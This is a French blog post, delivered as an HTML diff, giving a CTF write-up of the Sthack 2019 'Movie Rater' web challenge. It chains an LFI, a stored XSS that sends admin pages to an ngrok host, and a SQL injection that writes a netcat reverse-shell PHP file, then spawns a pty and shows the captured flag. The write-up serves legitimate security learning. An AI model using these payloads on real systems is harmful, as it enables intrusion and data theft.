@@ -1,0 +1,260 @@
+<!DOCTYPE html>
+<html lang="fr" class="light">
+
+<title>Write up - Movie Rater - Sthack 2019 | Keclem blog</title>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Dans cet article, je vais vous présenter le write up d’une épreuve web du CTF de la Sthack 2019, un événement dédié à la sécurité informatique sur Bordeaux q...">
+<meta name="author" content="Keclem blog">
+<meta name="generator" content="Jekyll v3.8.5">
+<link rel="canonical" href="http://localhost:4000/write-up-sthack-2019/">
+<link rel="stylesheet" href="/assets/css/index.css">
+<link rel="stylesheet" href="/assets/css/theme.css">
+<link rel="alternate" type="application/atom+xml" href="/feed.xml" title="Keclem blog" />
+
+
+
+
+<header class="dark">
+  
+    <h1><a href="/">Keclem blog</a></h1>
+  
+  
+    <nav>
+    
+      
+        <a href="/">Home</a>
+      
+    
+      
+        <a href="/about/">About</a>
+      
+    
+    </nav>
+  
+  
+</header>
+
+<article>
+  <header><h1><a href="/write-up-sthack-2019/">Write up - Movie Rater - Sthack 2019</a></h1>
+    <time datetime="2019-06-19T00:00:00+02:00">June 19, 2019</time>
+  </header>
+<p>Dans cet article, je vais vous présenter le write up d’une épreuve web du CTF de la Sthack 2019, un événement dédié à la sécurité informatique sur Bordeaux qui s’est déroulé le 14 Juin 2019.</p>
+
+<p>Avant de commencer l’explication de ce challenge, je tiens à remercier la <a href="https://twitter.com/TeamCryptis" title="Twitter team cryptis">@TeamCryptis</a> de m’avoir accueillie au sein de leur équipe durant ce CTF et avec qui j’ai pu réaliser cette superbe première place.</p>
+
+<p><img src="/assets/images/sthack_2019/classement_sthack_2019_bis.jpg" alt="Classement" /></p>
+
+<p>On peut remercier <a href="https://twitter.com/sth4ck" title="Twitter de la sthack">@sth4ck</a> pour cette magnifique photo du classement 2019. ;)</p>
+
+<h1 id="etape-1--tour-dhorizon-du-challenger">Etape 1 : Tour d’horizon du challenger</h1>
+<p>Movie rater est un site où l’administrateur donne sa note sur les films de “hacker” préférés. Ce site est composé de trois pages accessibles pour le visiteur. Nous verrons par la suite qu’il existe d’autres pages utilisés par l’administrateur. Voici les trois pages:</p>
+<ul>
+  <li>Home : La page home qui n’a pas beaucoup d’interêt</li>
+  <li>Movies : Cette page affiche toutes les affiches des films et leurs notes.
+<img src="/assets/images/sthack_2019/movie_rater_page_movies.png" alt="Page movies" /></li>
+  <li>Rate : Cette page montre la photo de l’affiche et sa note ainsi que champs textbox pour donner son avis sur la note du film si le visiteur n’est pas d’accord avec la note donnée.
+<img src="/assets/images/sthack_2019/change-rate.png" alt="Page rate" /></li>
+</ul>
+
+<h1 id="etape-2--la-faille-lfi">Etape 2 : La faille LFI</h1>
+<p>Après ce tour d’horizon du site, on remarque que les pages Movies et Rate sont appelées via le paramètre GET “page=”. On ajoute le caractère apostrophe à la fin de la valeur du paramètre. Nous pouvons voir que la page affiche une erreur montrant qu’il y a une faille au niveau de l’inclusion php des pages, la première faille du site est donc un LFI (<a href="https://fr.wikipedia.org/wiki/Remote_File_Inclusion" title="Wikipédia Local File Inclusion">Local File Inclusion</a> )</p>
+
+<p><img src="/assets/images/sthack_2019/faille_lfi.png" alt="Page rate" /></p>
+
+<p>Pour rappel une LFI permet notamment de lire le code php de la page à grace aux fonctions de filtrage de PHP. Pour récupérer le code des pages du site, nous allons utiliser le filtre base 64 de PHP comme ceci:</p>
+
+<figure class="highlight"><pre><code class="language-php" data-lang="php"><span class="nx">php</span><span class="o">://</span><span class="nx">filter</span><span class="o">/</span><span class="nx">convert</span><span class="o">.</span><span class="nx">base64</span><span class="o">-</span><span class="nx">encode</span><span class="o">/</span><span class="nx">resource</span><span class="o">=</span><span class="nx">movies</span></code></pre></figure>
+
+<p>Toutefois pour que cela fonctionne, il faut faire un urlencode de ce payload.</p>
+
+<figure class="highlight"><pre><code class="language-php" data-lang="php"><span class="nx">php</span><span class="o">%</span><span class="mi">3</span><span class="nx">A</span><span class="o">%</span><span class="mi">2</span><span class="nx">F</span><span class="o">%</span><span class="mi">2</span><span class="nx">Ffilter</span><span class="o">%</span><span class="mi">2</span><span class="nx">Fconvert</span><span class="o">.</span><span class="nx">base64</span><span class="o">-</span><span class="nx">encode</span><span class="o">%</span><span class="mi">2</span><span class="nx">Fresource</span><span class="o">%</span><span class="mi">3</span><span class="nx">Dmovies</span></code></pre></figure>
+
+<h1 id="etape-3--lecture-des-fichiers-php">Etape 3 : Lecture des fichiers php</h1>
+<h2 id="indexphp">index.php</h2>
+<p>Dans l’index.php, nous pouvons voir la faille LFI qui nous a permis de récupérer les fichiers php. On remarque qu’il n’y a aucun contrôle sur les entrées utilisateur dans le paramètre “page”.</p>
+
+<figure class="highlight"><pre><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span> <span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'page'</span><span class="p">])){</span><span class="k">include</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'page'</span><span class="p">]</span><span class="o">.</span><span class="s1">'.php'</span><span class="p">);}</span><span class="k">else</span><span class="p">{</span><span class="cp">?&gt;</span></code></pre></figure>
+
+<h2 id="headphp">head.php</h2>
+<p>Petit détail amusant, un blocage de SQLmap apparaît dans le fichier head.php. Bah oui, on est à la Sthack, tu vas quand même pas t’amuser à utiliser un outil qui te permet de te l’a coulé douce la main dans le slip pendant le CTF !.</p>
+
+<figure class="highlight"><pre><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
+	<span class="nv">$user_agent</span> <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'HTTP_USER_AGENT'</span><span class="p">];</span> 
+
+	<span class="k">if</span> <span class="p">(</span><span class="nb">stripos</span><span class="p">(</span> <span class="nv">$user_agent</span><span class="p">,</span> <span class="s1">'sqlmap'</span><span class="p">)</span> <span class="o">!==</span> <span class="kc">false</span><span class="p">)</span>
+	<span class="p">{</span>
+	    <span class="k">die</span><span class="p">(</span><span class="s2">"Hmm Hmm"</span><span class="p">);</span>
+	<span class="p">}</span>
+<span class="cp">?&gt;</span></code></pre></figure>
+
+<h2 id="ratephp">rate.php</h2>
+<p>Ce fichier rate.php correspond à la page d’affichage et commentaire de la note du film. Dans celle-ci, nous pouvons voir plusieurs choses intéressantes.</p>
+
+<p>Premièrement, il y a un contrôle des entrées utilisateur au niveau du paramètre “id” de l’URL. Seul des chiffres peuvent être entré dans ce paramètre. Donc pas une voie utilisable pour la réussite de ce challenge.</p>
+
+<figure class="highlight"><pre><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
+	<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">preg_match</span><span class="p">(</span><span class="s2">"/^[0-9]</span><span class="si">{</span><span class="nv">1,2</span><span class="si">}</span><span class="s2">$/"</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'id'</span><span class="p">]))</span>
+	<span class="p">{</span>
+	  <span class="k">die</span><span class="p">(</span><span class="s1">'&lt;center&gt;&lt;h1&gt;Do not hack me !&lt;/h1&gt;&lt;/center&gt;'</span><span class="p">);</span>
+	<span class="p">}</span>
+<span class="cp">?&gt;</span></code></pre></figure>
+
+<p>Deuxièmement, on peut voir que le commentaire envoyé à l’admin passe par une page nommée : change-rate.php</p>
+
+<figure class="highlight"><pre><code class="language-html" data-lang="html"><span class="nt">&lt;form</span>  <span class="na">class=</span><span class="s">"form"</span> <span class="na">method=</span><span class="s">"post"</span> <span class="na">action=</span><span class="s">"/change-rate.php?id=&lt;?php echo $res['id']?&gt;"</span><span class="nt">&gt;</span>
+  <span class="nt">&lt;textarea</span> <span class="na">class=</span><span class="s">"form-control"</span> <span class="na">name=</span><span class="s">"comment"</span><span class="nt">&gt;&lt;/textarea&gt;</span>
+  <span class="nt">&lt;/br&gt;</span>
+  <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="na">class=</span><span class="s">"btn btn-block"</span><span class="nt">/&gt;</span>
+<span class="nt">&lt;/form&gt;</span></code></pre></figure>
+
+<h2 id="change-ratephp">change-rate.php</h2>
+<p>Récupérons donc le code de cette page à l’aide de la faille LFI !</p>
+
+<p>Dans le code cette page, nous voyons que le commentaire est stocké dans une table qui semble temporaire et qui va permettre à l’administrateur de site de lire ce commentaire.</p>
+
+<figure class="highlight"><pre><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
+	<span class="nv">$req</span> <span class="o">=</span> <span class="nv">$bdd</span><span class="o">-&gt;</span><span class="na">prepare</span><span class="p">(</span><span class="s2">"INSERT INTO comments_to_be_reviewed (movie_id,comment) VALUES (:id,:comment)"</span><span class="p">);</span>
+	<span class="nv">$id</span> <span class="o">=</span> <span class="nx">movieId</span><span class="p">(</span><span class="nb">intval</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'id'</span><span class="p">]));</span>
+	<span class="nv">$req</span><span class="o">-&gt;</span><span class="na">bindParam</span><span class="p">(</span><span class="s1">':id'</span><span class="p">,</span><span class="nv">$id</span><span class="p">);</span>
+	<span class="c1">//add filter to escape SQLi</span>
+	<span class="nv">$req</span><span class="o">-&gt;</span><span class="na">bindParam</span><span class="p">(</span><span class="s1">':comment'</span><span class="p">,</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'comment'</span><span class="p">]);</span>
+	<span class="nv">$req</span><span class="o">-&gt;</span><span class="na">execute</span><span class="p">();</span>
+	<span class="k">echo</span> <span class="s2">"Your comment is under review by an administrator"</span><span class="p">;</span>
+<span class="cp">?&gt;</span></code></pre></figure>
+
+<p>Cela peut signifier que l’administrateur va lire les commentaires envoyés et que par conséquent qu’il peut y avoir une faille XSS à l’ouverture ceux-ci.</p>
+
+<h1 id="etape-4--tester-de-la-faille-xss">Etape 4 : Tester de la faille XSS</h1>
+<p>Pour tester si la faille est présente, on va envoyer le payload suivant:</p>
+
+<figure class="highlight"><pre><code class="language-js" data-lang="js"><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span> <span class="nb">window</span><span class="p">.</span><span class="nx">location</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">http://XXXXXXXX.ngrok.io</span><span class="dl">"</span><span class="o">&lt;</span><span class="sr">/script&gt;</span></code></pre></figure>
+
+<p>Ce payload va simplement rediriger l’administrateur vers une autre adresse. Ici j’utilise le logiciel ngrok qui permet de créer un tunnel de son localhost vers internet, c’est très pratique lorsque l’on veut partager un site en cours de développement en local via internet.</p>
+
+<p>Ici l’utilisation de ngrok va permettre de voir les requêtes effectuées sur notre adresse à grace au panneau de suivi d’activité du logiciel.</p>
+
+<p><img src="/assets/images/sthack_2019/ngrock-test-lfi.png" alt="viewing_panel" /></p>
+
+<p>Nous pouvoir voir que deux requêtes sont arrivées, cela signifie qu’il y a bien une faille XSS lorsque l’administrateur lit les commentaires.</p>
+
+<p>Exploitons cette faille pour connaître le code de la partie accessible par l’admin. Pour cela, on va récupérer le nom du fichier php utilisé pour lire les commentaires. Comme ceux-ci:</p>
+
+<figure class="highlight"><pre><code class="language-js" data-lang="js"><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span> <span class="nb">window</span><span class="p">.</span><span class="nx">location</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">http://XXXXXXXX.ngrok.io?location=</span><span class="dl">"</span><span class="o">+</span> <span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span><span class="o">&lt;</span><span class="sr">/script&gt;</span></code></pre></figure>
+
+<p>À la réception de la requête, on récupère /the-admin-secure-interface/review_comment.php.</p>
+
+<h1 id="etape-5--lecture-des-fichiers-accessibles-par-ladmin">Etape 5 : Lecture des fichiers accessibles par l’admin</h1>
+<p>La lecture du fichier review_comment.php ne montre rien d’intéressant pour la résolution du challenge mise à part la faille XSS.</p>
+
+<p>En effet, la page récupère le commentaire et affiche le commentaire sans le contrôler ce qui a été écrit.</p>
+
+<figure class="highlight"><pre><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
+	<span class="nv">$read</span> <span class="o">=</span> <span class="nv">$bdd</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="s1">'select comment,movie_id from comments_to_be_reviewed LIMIT 1'</span><span class="p">);</span>
+	
+	<span class="k">while</span><span class="p">(</span><span class="nv">$r</span><span class="o">=</span><span class="nv">$read</span><span class="o">-&gt;</span><span class="na">fetch</span><span class="p">()){</span>
+<span class="cp">?&gt;</span>
+	<span class="nt">&lt;p&gt;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$r</span><span class="p">[</span><span class="s1">'comment'</span><span class="p">];</span> <span class="cp">?&gt;</span><span class="nt">&lt;/p&gt;</span>
+
+<span class="cp">&lt;?php</span>	
+	<span class="nv">$del</span><span class="o">=</span><span class="nv">$bdd</span><span class="o">-&gt;</span><span class="na">exec</span><span class="p">(</span><span class="s2">"delete from comments_to_be_reviewed where movie_id='"</span><span class="o">.</span><span class="nv">$r</span><span class="p">[</span><span class="s1">'movie_id'</span><span class="p">]</span><span class="o">.</span><span class="s2">"'"</span><span class="p">);</span>
+	<span class="p">}</span>
+<span class="cp">?&gt;</span></code></pre></figure>
+
+<p>La page review_comment.php ne donnant rien, explorons la page /the-admin-secure-interface/index.php. Une fois le dump effectué on peut voir qu’il existe une page nommée /the-admin-secure-interface/stats.php.</p>
+
+<h2 id="the-admin-secure-interfacestatsphp">/the-admin-secure-interface/stats.php</h2>
+<p>Le dump de cette page révèle que cette page affiche les statistiques d’un film. Mais ce qui saute aux yeux, c’est qu’il y a une faille SQLi lors de la récupération des informations.</p>
+
+<figure class="highlight"><pre><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span> 
+	<span class="nv">$req</span> <span class="o">=</span> <span class="nv">$bdd</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="s2">"select name,rating from movies where id='"</span><span class="o">.</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'stats_id'</span><span class="p">]</span><span class="o">.</span><span class="s2">"'"</span><span class="p">);</span>
+	<span class="nv">$res</span> <span class="o">=</span> <span class="nv">$req</span><span class="o">-&gt;</span><span class="na">fetch</span><span class="p">();</span>
+	<span class="nb">print_r</span><span class="p">(</span><span class="nv">$res</span><span class="p">);</span>
+<span class="cp">?&gt;</span></code></pre></figure>
+
+<p>On peut voir que le paramètre GET est directement concaténé avec la requête SQL et qu’une nouvelle fois, il n’y a aucun contrôle sur les entrées utilisateur et aucune utilisation d’une solution sécurisée comme <a href="https://www.php.net/manual/fr/book.pdo.php" title="Documentation de PDO">PDO</a> pour les requêtes SQL.</p>
+
+<h1 id="etape-6--exploitation-de-la-faille-sqli">Etape 6 : Exploitation de la faille SQLI</h1>
+<p>Pour exploiter cette faille, il faut avoir accès à la page mais seul l’administrateur peut accéder à cette page.</p>
+
+<p><img src="/assets/images/sthack_2019/cannot-access-stats.png" alt="cannont_access_stats" /></p>
+
+<p>Pour ce faire, il faut passer par la faille XSS pour forcer l’administrateur à effectuer l’attaque. Ce qui fait que l’exploit va se dérouler en 3 étapes :</p>
+<ul>
+  <li>Envoi de l’exploit via le commentaire et lecture du commentaire par l’administrateur</li>
+  <li>A la lecture du commentaire, récupération en GET de la page stats.php avec en paramètre de la page, l’exploit SQLi</li>
+  <li>Envoi du résultat de la requête GET en POST vers ngrok, pour que l’on puisse lire le résultat de l’exploit</li>
+</ul>
+
+<h2 id="présentation-de-la-structure-de-lexploit">Présentation de la structure de l’exploit</h2>
+<p>Avant d’exploiter la faille SQLi, regardons de plus près la structure du payload.</p>
+
+<figure class="highlight"><pre><code class="language-js" data-lang="js">	<span class="o">&lt;</span><span class="nx">script</span> <span class="nx">src</span><span class="o">=</span><span class="dl">"</span><span class="s2">https://ajax.googleapis.com/ajax/libs/jquery/3.4.0/jquery.min.js</span><span class="dl">"</span><span class="o">&gt;&lt;</span><span class="sr">/script</span><span class="err">&gt;
+</span>	<span class="o">&lt;</span><span class="nx">script</span> <span class="nx">type</span><span class="o">=</span><span class="dl">"</span><span class="s2">text/javascript</span><span class="dl">"</span><span class="o">&gt;</span>
+		<span class="nx">$</span><span class="p">.</span><span class="kd">get</span><span class="p">(</span><span class="dl">"</span><span class="s2">/the-admin-secure-interface/stats.php?stats_id=1</span><span class="dl">"</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">data</span><span class="p">,</span> <span class="nx">status</span><span class="p">){</span>
+	    	
+			<span class="nx">$</span><span class="p">.</span><span class="nx">post</span><span class="p">(</span><span class="dl">"</span><span class="s2">http://XXXXXXXX.ngrok.io</span><span class="dl">"</span><span class="p">,</span>
+		  	<span class="p">{</span>
+			    <span class="na">html</span><span class="p">:</span> <span class="nb">decodeURIComponent</span><span class="p">(</span><span class="nx">data</span><span class="p">)</span>
+			<span class="p">},</span>
+			<span class="kd">function</span><span class="p">(</span><span class="nx">data</span><span class="p">,</span> <span class="nx">status</span><span class="p">){});</span>
+	  	<span class="p">});</span>	
+	<span class="o">&lt;</span><span class="sr">/script&gt;</span></code></pre></figure>
+
+<p>La première ligne permet d’inclure JQuery dans la page afin de simplifier l’envoi des requêtes GET et POST. Ensuite la requête GET déclarée avec le $.get qui va retourner dans son callback le code html de la page stats.php.</p>
+
+<p>Dans ce même callback, on déclare la requête post ($.post) qui va nous renvoyer ce code html. Avant le renvoi vers ngrok, le code html est décodé (decodeURIComponent) pour ne pas a avoir à le décoder à chaque lecture de la requête.</p>
+
+<p>Maintenant que nous avons mis en place notre structure pour exploiter la faille SQLi, il faut chercher à comment exploiter cette faille. Le site n’ayant pas d’interface de login connu, inutile de chercher le mot de passe de l’administrateur dans la base de données. On va donc upload un reverse shell sur le serveur, ce qui est plus utile et plus fun que de récupérer un mot de passe.</p>
+
+<h2 id="connaître-le-nombre-de-colonne-de-la-requête">Connaître le nombre de colonne de la requête</h2>
+<p>Avant de pouvoir upload quoi que ce soit sur le serveur, on doit trouver le nombre de colonnes de la requête qui récupère les statistiques. Pour cela a modifié l’URL de la requête GET.</p>
+
+<p>Essai avec une colonne.</p>
+
+<figure class="highlight"><pre><code class="language-js" data-lang="js">		<span class="dl">"</span><span class="s2">/the-admin-secure-interface/stats.php?stats_id=' union select '666</span><span class="dl">"</span></code></pre></figure>
+
+<p>Il y a une erreur php, ce qui signifie que ce n’est pas une colonne. Essai pour deux colonnes :</p>
+
+<figure class="highlight"><pre><code class="language-js" data-lang="js">		<span class="dl">"</span><span class="s2">/the-admin-secure-interface/stats.php?stats_id=' union select '666', '667</span><span class="dl">"</span></code></pre></figure>
+
+<p>Cette fois le retour de la requête ne revoie aucune erreur, cela signifie qu’il y a deux colonnes à la requête.</p>
+
+<h2 id="upload-du-reverse-shell">Upload du reverse shell</h2>
+<p>Maintenant que l’on connaît le nombre de colonnes, nous allons pour pouvoir upload le reverse shell à l’aide de SQL. En effet, le langage SQL permet de pouvoir écrire des fichiers à l’aide de INTO OUTERFILE, ce qui va permettre d’upload un fichier php qui va ensuite permettre d’obtenir un reverse shell.</p>
+
+<figure class="highlight"><pre><code class="language-js" data-lang="js">		<span class="dl">"</span><span class="s2">/the-admin-secure-interface/stats.php?stats_id=1' union select '', '&lt;?php system(</span><span class="se">\"</span><span class="s2">nc -e /bin/sh &lt;ip&gt; &lt;port&gt; </span><span class="se">\"</span><span class="s2">)?&gt;' INTO OUTFILE '/tmp/rs.php</span><span class="dl">"</span></code></pre></figure>
+
+<p>Comme nous pouvons le voir, au chargement du script php, le script va exécuter la commande netcat vers notre ip (en écoute sur netcat), ce qui va une fois la connexion établie nous donner un bash.</p>
+
+<h1 id="etape-7--récupération-du-flag">Etape 7 : Récupération du flag</h1>
+<p>Pour établir la connexion reverse shell, il faut exécuter le code php. Pour cela, on utilise la faille LFI pour charger le script.</p>
+
+<figure class="highlight"><pre><code class="language-js" data-lang="js">		<span class="dl">"</span><span class="s2">?page=../../../tmp/rs</span><span class="dl">"</span></code></pre></figure>
+
+<p>Une fois la connexion établie, et après une recherche dans les dossiers du serveur, on tombe sur /home/acid_burn qui possède une binaire nommé getFlag.</p>
+
+<p>On execute le binaire et nous demande un pseudoterminal(<a href="https://fr.wikipedia.org/wiki/Pseudo_terminal" title="Wikipédia pseudoterminal">pty</a> ) pour s’exécuter.</p>
+
+<p>Il y a plein de façon d’obtenir un shell pty, le site  <a href="https://netsec.ws/?p=337" title="Liste des shell pty">netsec</a> à lister plusieurs façons d’obtenir un pty shell. Pour ce challenge, on utilise python en faisant :</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">	python <span class="nt">-c</span> <span class="s1">'import pty;pty.spawn("/bin/bash")'</span></code></pre></figure>
+
+<p>Une fois le shell pty obtenu, on peut exécuter le binaire est récupérer le flag :</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">	Sql14nDAC5RF_R3alY?!</code></pre></figure>
+
+  
+  
+</article>
+
+
+<footer class="">
+  <span></span>
+  <a class="gray" href="/welcome-to-jekyll/">Welcome to Jekyll »</a>
+</footer>
+
+
+
+
+</html>
